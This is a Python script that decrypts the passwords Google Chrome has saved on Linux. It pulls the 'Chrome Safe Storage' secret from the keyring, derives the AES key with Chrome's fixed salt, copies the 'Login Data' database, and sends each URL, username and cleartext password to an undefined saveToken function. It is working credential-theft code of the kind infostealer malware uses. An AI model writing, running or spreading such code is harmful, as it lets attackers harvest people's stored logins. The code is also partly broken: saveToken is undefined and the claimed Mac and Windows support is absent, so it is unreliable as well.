""" Get unencrypted 'Saved Password' from Google Chrome
    Supported platform: Mac, Linux and Windows
"""
import json
import os
import platform
import sqlite3
import string ,base64
import subprocess

from urllib.parse import urlparse
from getpass import getuser
from importlib import import_module
from os import unlink
from shutil import copy
import secretstorage
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2


class ChromeLinux:
    """ Decryption class for chrome linux installation """
    def __init__(self):
        """ Linux Initialization Function """
        my_pass = 'peanuts'.encode('utf8')
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                my_pass = item.get_secret()
                break

        iterations = 1
        salt       = b'saltysalt'
        length     = 16

        kdf = import_module('Crypto.Protocol.KDF')
        self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"


        self.iv = b' ' * 16
        self.password = 'peanuts'.encode('utf8')

        bus        = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)

        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                self.password = item.get_secret()
                break

        # base64_bytes
        # print( self.password.decode('utf-8') )
    # def decrypt_func(self, enc_passwd):
    #     """ Linux Decryption Function """
    #     aes = import_module('Crypto.Cipher.AES')
    #     initialization_vector = b' ' * 16
    #     enc_passwd = enc_passwd[3:]
    #     cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
    #     decrypted = cipher.decrypt(enc_passwd)
    #     return decrypted.strip().decode('utf8')

    def replace_chars(self, decrypted):
        """ replaces specific bytestring characters from decrypted bytestring
        :param decrypted: bytestring
        :return: bytestring without special chars
        """
        for c in self.bytechars:
            decrypted = decrypted.replace(c, b'')
        return decrypted

    def decrypt_func(self, encrypted_password):
        """ decrypt the given encrypted password
        :param encrypted_password: encrypted password
        :return decrypted password
        """

        self.key = PBKDF2(
            password = self.password,
            salt     = b'saltysalt',
            dkLen    = 16,
            count    = 1
        )

        self.cipher = AES.new(self.key, AES.MODE_CBC, IV=self.iv)
        self.bytechars =[ b'\x01', b'\x02', b'\x03', b'\x04', b'\x05', b'\x06', b'\x07', b'\x08', b'\x09' ]

        enc_passwd = encrypted_password[3:]
        decrypted = self.cipher.decrypt( enc_passwd )

        try:
            decrypted = self.replace_chars(decrypted=decrypted)
            return decrypted.decode('utf8')
        except UnicodeDecodeError as ex:
            return ''

        # print( password.decode('utf8','surrogateescape') )
        # print( password )
        return password


class Chrome:
    """ Generic OS independent Chrome class """
    def __init__(self):
        self.chrome_os = ChromeLinux()

    @property
    def get_login_db(self):
        """ getting "Login Data" sqlite database path """
        return self.chrome_os.dbpath

    def get_password(self, prettyprint=False):
        """ get URL, username and password in clear text
            :param prettyprint: if true, print clear text password to screen
            :return: clear text data in dictionary format
        """
        copy(self.chrome_os.dbpath + "Login Data", "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()

        cursor.execute(" SELECT action_url,username_value,password_value FROM logins where username_value != '' and password_value != ''")
        # cursor.execute(" SELECT * FROM logins ")
        data = {}
        for result in cursor.fetchall():
            pass
            # print( result )

            passwd = self.chrome_os.decrypt_func(result[2])
            url = result[0].strip()
            domain = urlparse(url).netloc

            if 'localhost' in domain:
                continue

            if passwd.strip() == '' or domain.strip() == '':
                continue

            if ( result[1] or passwd ) and result[1].strip() != '':
                saveToken(
                    domain ,
                    passwd.strip(),
                    result[1].strip() ,
                    url
                )
                #
                # print(
                #     domain ,
                #     result[1].strip() ,
                #     passwd.strip()
                # )



def main():
    """ Operational Script """
    chrome_pwd = Chrome()
    print( chrome_pwd.get_login_db )
    chrome_pwd.get_password(prettyprint=True)


if __name__ == '__main__':
    main()
